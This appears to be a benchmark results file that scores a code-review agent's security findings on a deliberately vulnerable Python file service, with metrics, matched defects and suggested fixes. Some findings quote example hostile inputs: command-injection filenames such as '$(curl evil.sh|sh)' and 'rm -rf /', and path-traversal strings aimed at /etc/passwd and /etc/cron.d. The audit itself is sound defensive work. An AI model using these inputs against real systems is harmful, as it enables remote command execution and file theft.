@@ -1,0 +1,254 @@
+{
+  "dataset": "file_service",
+  "protocol": "react",
+  "target": "E:/university/dasan_up/agent/CodeAgentX/data/evaluation/file_service/target",
+  "valid": true,
+  "seconds": 26.179,
+  "usage": {
+    "calls": 4,
+    "failed_calls": 0,
+    "prompt_tokens": 17372,
+    "completion_tokens": 6204,
+    "total_tokens": 23576,
+    "latency": 24.957
+  },
+  "cost": {
+    "total_tokens": 23576,
+    "tokens_per_finding": 2357.6
+  },
+  "flags": {},
+  "judge": {},
+  "evaluation": {
+    "dataset": "file_service",
+    "target": "data/evaluation/file_service/target",
+    "protocol": "react",
+    "tolerance": 3,
+    "counts": {
+      "reported": 10,
+      "true_positives": 6,
+      "false_positives": 4,
+      "false_negatives": 0,
+      "labeled_defects": 6
+    },
+    "metrics": {
+      "precision": 0.6,
+      "recall": 1.0,
+      "f1": 0.75,
+      "false_positive_rate": 0.4,
+      "location_precision": 1.0
+    },
+    "matched": {
+      "path-traversal-download": "下载路径未规范化，存在路径穿越读取任意文件",
+      "no-authz-on-download": "download 接口不校验文件归属者，任意用户可越权下载",
+      "shell-injection-filename": "shell=True 拼接用户文件名导致命令注入",
+      "unbounded-upload-size": "上传无大小限制，流被一次性读入内存",
+      "unvalidated-content-type": "只信任客户端声明的 content-type，不校验真实内容",
+      "temp-file-leak": "临时文件与文件描述符双重泄漏"
+    },
+    "missed": [],
+    "verdicts": [
+      {
+        "index": 0,
+        "title": "下载路径未规范化，存在路径穿越读取任意文件",
+        "file": "fileservice/paths.py",
+        "line": 19,
+        "defect_id": "path-traversal-download",
+        "match": "line"
+      },
+      {
+        "index": 1,
+        "title": "download 接口不校验文件归属者，任意用户可越权下载",
+        "file": "fileservice/api.py",
+        "line": 21,
+        "defect_id": "no-authz-on-download",
+        "match": "line"
+      },
+      {
+        "index": 2,
+        "title": "shell=True 拼接用户文件名导致命令注入",
+        "file": "fileservice/storage.py",
+        "line": 34,
+        "defect_id": "shell-injection-filename",
+        "match": "line"
+      },
+      {
+        "index": 3,
+        "title": "上传文件名未过滤，可写出用户目录外任意路径",
+        "file": "fileservice/storage.py",
+        "line": 16,
+        "defect_id": "",
+        "match": ""
+      },
+      {
+        "index": 4,
+        "title": "api.upload 绕过类型校验，白名单形同虚设",
+        "file": "fileservice/api.py",
+        "line": 27,
+        "defect_id": "",
+        "match": ""
+      },
+      {
+        "index": 5,
+        "title": "上传无大小限制，流被一次性读入内存",
+        "file": "fileservice/upload.py",
+        "line": 14,
+        "defect_id": "unbounded-upload-size",
+        "match": "line"
+      },
+      {
+        "index": 6,
+        "title": "只信任客户端声明的 content-type，不校验真实内容",
+        "file": "fileservice/upload.py",
+        "line": 23,
+        "defect_id": "unvalidated-content-type",
+        "match": "line"
+      },
+      {
+        "index": 7,
+        "title": "临时文件与文件描述符双重泄漏",
+        "file": "fileservice/tempfiles.py",
+        "line": 15,
+        "defect_id": "temp-file-leak",
+        "match": "line"
+      },
+      {
+        "index": 8,
+        "title": "STORAGE_ROOT 常量在多模块重复定义易不一致",
+        "file": "fileservice/storage.py",
+        "line": 9,
+        "defect_id": "",
+        "match": ""
+      },
+      {
+        "index": 9,
+        "title": "使用 % 旧式格式化拼接命令字符串",
+        "file": "fileservice/storage.py",
+        "line": 34,
+        "defect_id": "",
+        "match": ""
+      }
+    ]
+  },
+  "findings": [
+    {
+      "title": "下载路径未规范化，存在路径穿越读取任意文件",
+      "description": "storage_path 仅用 os.path.join(STORAGE_ROOT, relative_path) 做字符串拼接，既没有 os.path.realpath/Path.resolve 规范化，也没有校验结果是否仍以 STORAGE_ROOT 为前缀。当 relative_path 为 \"../../etc/passwd\" 或 \"....//....//etc/shadow\" 时，join 后的路径会跳出存储根目录，配合 api.download 直接 open() 即可读取进程权限内的任意文件（/etc/passwd、应用配置、其他租户数据）。触发条件：任何能控制下载路径参数的请求。",
+      "file": "fileservice/paths.py",
+      "line": 19,
+      "severity": "high",
+      "category": "security",
+      "suggestion": "先规范化再校验前缀，且用 commonpath 而非 startswith 避免 /data-evil 绕过：\n```python\nimport os\nbase = os.path.realpath(STORAGE_ROOT)\ncandidate = os.path.realpath(os.path.join(base, relative_path))\nif os.path.commonpath([base, candidate]) != base:\n    raise ValueError(\"非法路径\")\nreturn candidate\n```\n对多用户场景还应把 user 目录一并固定为 base。",
+      "evidence": "def storage_path(relative_path: str) -> str:\n    return os.path.join(STORAGE_ROOT, relative_path)  # 无 realpath，无前缀校验",
+      "confidence": 0.95,
+      "source": "react"
+    },
+    {
+      "title": "download 接口不校验文件归属者，任意用户可越权下载",
+      "description": "download 只调用 paths.storage_path 定位文件后直接读取返回，全程未使用 CURRENT_USER 做归属校验，也没有任何鉴权/ACL 检查。任何已登录用户只要猜到或构造出他人文件路径，就能下载他人私密文件，属于 IDOR/水平越权。触发条件：登录后请求任一不属于自己的文件路径。",
+      "file": "fileservice/api.py",
+      "line": 21,
+      "severity": "high",
+      "category": "security",
+      "suggestion": "在读取前校验路径位于当前用户自己的命名空间内，或查库确认 owner：\n```python\nfull_path = paths.storage_path(relative_path)\nif not paths.owned_by(full_path, CURRENT_USER):\n    return {\"status\": 403, \"message\": \"无权访问\"}\n```\n更稳的做法是把用户目录作为根：paths.storage_path(relative_path, user=CURRENT_USER)，并统一返回 404 防止路径探测。",
+      "evidence": "def download(relative_path):\n    full_path = paths.storage_path(relative_path)\n    return {\"status\": 200, \"content\": storage.read_file(full_path)}  # 未使用 CURRENT_USER",
+      "confidence": 0.95,
+      "source": "react"
+    },
+    {
+      "title": "shell=True 拼接用户文件名导致命令注入",
+      "description": "convert_to_pdf 用 % 格式化把用户可控的 filename 直接拼进命令字符串，再交给 shell=True 执行。文件名形如 \"a.txt; rm -rf /\"、\"$(curl evil.sh|sh)\" 或 \"`id`\" 时会被 shell 解析为额外命令，导致任意命令执行（RCE），影响为服务器完全失陷。上游 handle_upload/save_upload 对 filename 未做任何清洗，攻击者可通过上传接口写入恶意文件名并触发转换。",
+      "file": "fileservice/storage.py",
+      "line": 34,
+      "severity": "high",
+      "category": "security",
+      "suggestion": "去掉 shell，改用参数列表形式的 argv，工具名和参数分离：\n```python\nreturn subprocess.run(\n    [\"doc2pdf\", \"--input\", filename, \"--output\", filename + \".pdf\"],\n    shell=False, capture_output=True, check=False,\n)\n```\n同时对 filename 做白名单校验（如 os.path.basename + 正则），并传绝对路径。",
+      "evidence": "command = \"doc2pdf --input %s --output %s.pdf\" % (filename, filename)\nreturn subprocess.run(command, shell=True, capture_output=True)",
+      "confidence": 0.97,
+      "source": "react"
+    },
+    {
+      "title": "上传文件名未过滤，可写出用户目录外任意路径",
+      "description": "save_upload 直接 os.path.join(user_dir, filename) 后 open(path, \"wb\") 写入，filename 来自用户输入且未做 basename/白名单处理，也未经 realpath 前缀校验；user 参数同样未校验。上传 filename=\"../../etc/cron.d/x\" 或 \"/etc/passwd\" （绝对路径会覆盖 join 结果）即可覆盖任意可写文件，实现任意文件写入乃至提权。触发条件：调用上传接口并提供恶意文件名。",
+      "file": "fileservice/storage.py",
+      "line": 16,
+      "severity": "high",
+      "category": "security",
+      "suggestion": "强制取 basename 并校验扩展名白名单，落盘后再用 realpath 校验仍在 user_dir 内：\n```python\nsafe_name = os.path.basename(filename)\nif not safe_name or safe_name != filename:\n    return {\"status\": 400, \"message\": \"非法文件名\"}\npath = os.path.join(user_dir, safe_name)\n```\n另建议临时文件写入 + os.replace 原子落盘，避免半截文件。",
+      "evidence": "user_dir = os.path.join(STORAGE_ROOT, user)\nos.makedirs(user_dir, exist_ok=True)\npath = os.path.join(user_dir, filename)\nwith open(path, \"wb\") as handle:\n    handle.write(content)",
+      "confidence": 0.9,
+      "source": "react"
+    },
+    {
+      "title": "api.upload 绕过类型校验，白名单形同虚设",
+      "description": "upload 端点直接调用 storage.save_upload，而没有走 upload.handle_upload 这条包含 check_content_type 的入口。结果是 upload.py 里的类型白名单在实际请求路径上完全不会被执行（check_content_type/read_upload 成为死代码），声明的 content-type 校验能力在实际接口上不存在。这与 upload.py 中的校验意图不一致，也说明模块间缺少统一的落盘入口。",
+      "file": "fileservice/api.py",
+      "line": 27,
+      "severity": "medium",
+      "category": "bug",
+      "suggestion": "让接口层统一走 upload.handle_upload，由该函数负责校验与读取：\n```python\nfrom fileservice import upload as upload_handler\n\ndef upload(filename, content, content_type):\n    return upload_handler.handle_upload(CURRENT_USER, filename, content, content_type)\n```\n并补充针对该入口的单元测试，防止后续再次绕过。",
+      "evidence": "api.py: def upload(filename, content, content_type):\n    return storage.save_upload(CURRENT_USER, filename, content, content_type)\nupload.py: def handle_upload(user, filename, stream, content_type):\n    if not check_content_type(content_type): ...  # 未被 api 调用",
+      "confidence": 0.88,
+      "source": "react"
+    },
+    {
+      "title": "上传无大小限制，流被一次性读入内存",
+      "description": "read_upload 直接 stream.read() 把整个上传体读进内存，没有 Content-Length 校验、没有上限、也没有分块读取。攻击者上传数 GB 文件（或分块传输绕过 Content-Length）即可让进程内存耗尽被 OOM Kill，造成服务不可用。触发条件：任意上传请求。",
+      "file": "fileservice/upload.py",
+      "line": 14,
+      "severity": "medium",
+      "category": "performance",
+      "suggestion": "设定上限并分块写入磁盘：\n```python\nMAX_UPLOAD = 10 * 1024 * 1024\ndef read_upload(stream, limit=MAX_UPLOAD):\n    data = stream.read(limit + 1)\n    if len(data) > limit:\n        raise ValueError(\"文件过大\")\n    return data\n```\n大文件场景应改为流式分块落盘（chunk = stream.read(64 * 1024) 循环写入），并在网关层限制 body 大小。",
+      "evidence": "def read_upload(stream):\n    return stream.read()  # 无大小上限、无分块",
+      "confidence": 0.93,
+      "source": "react"
+    },
+    {
+      "title": "只信任客户端声明的 content-type，不校验真实内容",
+      "description": "check_content_type 仅判断客户端传入的 content_type 字符串是否在白名单内，未对文件内容做魔术字节嗅探，也未校验扩展名是否与类型一致。攻击者把 .py/.sh/.html 脚本的请求头声明为 text/plain 即可通过校验并落盘；若后续有静态资源目录或直接执行/预览逻辑，将升级为存储型 XSS 或 RCE。触发条件：伪造 Content-Type 上传任意文件。",
+      "file": "fileservice/upload.py",
+      "line": 23,
+      "severity": "medium",
+      "category": "security",
+      "suggestion": "结合内容嗅探与扩展名白名单双重校验：\n```python\nimport imghdr\nALLOWED_EXT = {\"txt\", \"png\", \"pdf\"}\ndef check_upload(filename, content, declared):\n    ext = os.path.splitext(filename)[1].lstrip(\".\").lower()\n    if ext not in ALLOWED_EXT:\n        return False\n    if declared not in ALLOWED_TYPES:\n        return False\n    if ext == \"png\" and imghdr.what(None, content[:32]) != \"png\":\n        return False\n    return True\n```\n并在存储目录禁用执行权限、下载时强制 Content-Disposition: attachment 与 X-Content-Type-Options: nosniff。",
+      "evidence": "def check_content_type(content_type):\n    return content_type in (\"text/plain\", \"image/png\", \"application/pdf\")  # 仅看声明，未嗅探内容",
+      "confidence": 0.9,
+      "source": "react"
+    },
+    {
+      "title": "临时文件与文件描述符双重泄漏",
+      "description": "make_temp_copy 中 tempfile.mkstemp 返回的 fd 从未 close()，且函数返回后临时文件既不删除也不注册 atexit/finally 清理；同时又用 open(path, \"wb\") 打开同一路径写第二次。每次调用泄漏一个 fd 和一份磁盘文件，长时间运行会耗尽 fd（EMFILE）并撑爆 /tmp 磁盘，preview_upload 被高频调用时尤为明显。触发条件：任何一次预览或下载预览调用。",
+      "file": "fileservice/tempfiles.py",
+      "line": 15,
+      "severity": "medium",
+      "category": "bug",
+      "suggestion": "用 os.fdopen 复用 fd，并交由调用方上下文清理：\n```python\nimport os, tempfile\nfrom contextlib import contextmanager\n\n@contextmanager\ndef make_temp_copy(content):\n    fd, path = tempfile.mkstemp(prefix=\"fileservice-\")\n    try:\n        with os.fdopen(fd, \"wb\") as handle:\n            handle.write(content)\n        yield path\n    finally:\n        os.unlink(path)\n```\n若必须返回路径，则注册 atexit 清理或改用 NamedTemporaryFile(delete=False) + 明确的生命周期管理。",
+      "evidence": "fd, path = tempfile.mkstemp(prefix=\"fileservice-\")\nwith open(path, \"wb\") as handle:   # fd 未 close，且重复打开\n    handle.write(content)\nreturn path  # 无 unlink，无清理注册",
+      "confidence": 0.92,
+      "source": "react"
+    },
+    {
+      "title": "STORAGE_ROOT 常量在多模块重复定义易不一致",
+      "description": "存储根目录 \"/var/lib/fileservice/data\" 在 paths.py:9 与 storage.py:9 各自硬编码一份，无单一数据源。一旦部署时修改任一处（或将根目录改为可配置），路径解析层与落盘层会指向不同目录，导致「上传成功但下载 404」等难以定位的问题；安全前缀校验也难以统一实施。",
+      "file": "fileservice/storage.py",
+      "line": 9,
+      "severity": "low",
+      "category": "maintainability",
+      "suggestion": "抽到公共配置模块（如 fileservice/config.py）或统一从环境变量读取，两处都引用同一来源：\n```python\n# config.py\nimport os\nSTORAGE_ROOT = os.environ.get(\"FILESERVICE_ROOT\", \"/var/lib/fileservice/data\")\n```\n然后 paths.py / storage.py 改为 `from fileservice.config import STORAGE_ROOT`。",
+      "evidence": "paths.py:9  STORAGE_ROOT = \"/var/lib/fileservice/data\"\nstorage.py:9  STORAGE_ROOT = \"/var/lib/fileservice/data\"",
+      "confidence": 0.85,
+      "source": "react"
+    },
+    {
+      "title": "使用 % 旧式格式化拼接命令字符串",
+      "description": "ruff 检查（UP031）报出该行使用百分号格式化，属于已过时的写法。虽然本身不是安全漏洞，但在拼接外部命令的场景下，字符串格式化写法容易掩盖参数注入风险，也与项目其余 f-string/format 风格不统一。",
+      "file": "fileservice/storage.py",
+      "line": 34,
+      "severity": "low",
+      "category": "style",
+      "suggestion": "改为参数列表传参（同时消除注入风险，见命令注入条目）：subprocess.run([\"doc2pdf\", \"--input\", filename, \"--output\", f\"{filename}.pdf\"], shell=False, capture_output=True)。若确需格式化文本，统一使用 f-string 或 str.format。",
+      "evidence": "ruff: UP031 storage.py:34:15 \"Use format specifiers instead of percent format\"",
+      "confidence": 0.95,
+      "source": "react"
+    }
+  ]
+}
